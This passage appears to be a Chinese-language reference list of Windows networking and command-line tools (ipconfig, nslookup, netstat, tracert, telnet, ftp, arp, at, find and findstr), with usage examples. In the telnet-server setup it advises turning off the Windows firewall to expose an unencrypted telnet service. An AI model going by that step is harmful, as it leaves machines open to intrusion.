a. 首先查本地arp cache信息，看是否有对方的mac地址和IP地址映射条目记录
b. 如果没有，则发起一个arp请求广播包，等待对方告知具体的mac地址
c. 收到arp响应包之后，获得某个IP对应的具体mac地址，有了物理地址之后才可以开始通信了,同时对ip-mac地址做一个本地cache
d. 发出icmp echo request包，收到icmp echo reply包

ipconfig /all  // 查看本地ip地址等详细信息

ipconfig /displaydns  // 显示本地dns缓存的内容

ipconfig /flushdns  // 清除本地dns缓存的内容

nslookup www.cnblogs.com  // 获取www.cnblogs.com的域名解析

服务器: gm-captiva.tencent.com//DNS服务器的主机名
Address: 10.6.18.41//DNS服务器IP

非权威应答:
名称: www.cnblogs.com//解析的域名URL
Address: 42.121.252.58//解析回的IP

nslookup -d www.cnblogs.com  // 打印出www.cnblogs.com的域名解析所有记录

netstat -a   // 查看开启了哪些端口

netstat -n  // 查看端口的网络连接情况

netstat -v   // 查看正在进行的工作

netstat -p tcp  // 查看tcp协议的使用情况

tracert 182.140.167.44  // 查看本机到达182.140.167.44的路由路径

route print  // 显示出IP路由

telnet 182.140.167.44 8000   // 探测182.140.167.44是否使用TCP协议监听8000端口（注意：telnet命令不支持UDP端口检测）

说明：如果端口关闭或者无法连接，则显示不能打开到主机的链接，链接失败；端口打开的情况下，链接成功，则进入telnet页面（全黑的），证明端口可用。

用于探测指定IP的端口号，只是telnet的一个基本功能；

远程登录到网络中的计算机，并以命令行的方式远程管理计算机才是telnet命令的强大之处。

windows telnet服务器(默认端口：23)环境配置过程如下： 参考1

a. 安装telnet服务器



b. 启动Telnet服务



c. 关闭windows防火墙    注：若不想关闭防火墙，则需要在Windows防火墙 -- 高级设置里面对Telnet服务器的访问规则进行配置



ftp 46.19.34.198 21  // 连接46.19.34.198 ftp服务器（21为端口号），然后会要求输入用户名与密码；连接成功后，具体如何使用可以键入?来查看帮助说明

arp   显示和修改地址解析协议(ARP)使用的“IP到mac”的地址转换表

例：arp -a  // 显示arp缓存表

at  计划任务（必须保证“Task Scheduler”服务启动   net start "task scheduler"）

例：at  // 查看所有的计划任务

例：at /delete /yes  // 停止所有任务计划（不需要确认）

例：at 1  // 开启id为1的计划任务

例：at 1 /delete /yes  // 停止id为1的计划任务（不需要确认）

例：at 12:42 shutdown –s –t30   // 到12:42 ，电脑会出现“ 系统关机 ”对话框，并默认 30 秒延时自动关机

例：at cmd /c dir > c:\test.out   // 如果命令不是exe文件，必须在命令前加上cmd /c

例：at 6:00AM /every:Saturday task.bat   // 在每周六早上6点，电脑定时启动task.bat批处理文件

例：at \\chen 12:00 shutdown /r   // 到12:00时，关闭名为chen的计算机

例：at \\192.168.1.166 12:00 shutdown /r   // 到12:00时，关闭ip为192.168.1.166的计算机

9. 文本处理

edit config.ini  // 编辑config.ini文件（会进入edit字符编辑器；按alt，可以选择对应的菜单） win7 x64下没有该命令

find  文件中搜索字符串

例：find /N /I "pid" 1.txt  // 在1.txt文件中忽略大小写查找pid字符串，并带行号显示查找后的结果

例：find /C "exe" 1.txt  // 只显示在1.txt文件中查找到exe字符串的次数

例：find /V "exe" 1.txt  // 显示未包含1.txt文件中未包含exe字符串的行

findstr  文件中搜索字符串

例：findstr "hello world" 1.txt  // 在1.txt文件中搜索hello或world

例：findstr /c:"hello world" 1.txt  // 在1.txt文件中搜索hello world

例：findstr /c:"hello world" 1.txt nul  // 在1.txt文件中搜索hello world，并在每行结果前打印出1.txt:   注：findstr只有在2个及以上文件中搜索字符串时才会打印出每个文件的文件名，nul表示一个空文件

例：findstr /s /i "Hello" *.*   // 不区分大小写，在当前目录和所有子目录中的所有文件中的hello

例：findstr  "^[0-9][a-z]" 1.txt  // 在1.txt中搜索以1个数字+1个小写字母开头子串的行
"""